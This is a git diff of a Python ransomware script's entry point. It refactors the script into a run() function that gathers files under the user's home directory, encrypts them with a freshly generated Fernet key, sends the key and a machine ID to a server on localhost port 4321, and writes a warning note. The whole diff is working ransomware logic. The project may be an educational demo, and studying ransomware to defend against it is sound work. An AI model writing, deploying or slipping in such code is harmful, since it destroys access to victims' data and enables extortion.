@@ -27,22 +27,27 @@
 # SOFTWARE.
 
 from pathlib import Path
-
-from encrypter import encrypt_files, gen_key, get_fernet
+from cryptography.fernet import Fernet
+from encrypter import parse_files
 from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
 from utils import gen_machine_id, send_key, save_warning_text
 
 SERVER_HOST = "localhost"
 PORT = 4321
 
-target_path = Path.home()
+KEY = Fernet.generate_key()
+fernet = Fernet(KEY)
+MACHINE_ID = gen_machine_id()
 
-key = gen_key()
-fernet = get_fernet(key)
-machine_id = gen_machine_id()
 
-files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)
-encrypt_files(fernet, files)
+def run(target: Path | None = None):
+    target_path = Path.home() if not target else target
+    files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)
+    print(f"Found {len(files)} files")
+    parse_files(fernet, files)
+    send_key(f"http://{SERVER_HOST}:{PORT}", KEY, MACHINE_ID)
+    save_warning_text(MACHINE_ID)
 
-send_key(f"http://{SERVER_HOST}:{PORT}", key, machine_id)
-save_warning_text(machine_id)
+
+if __name__ == "__main__":
+    run()
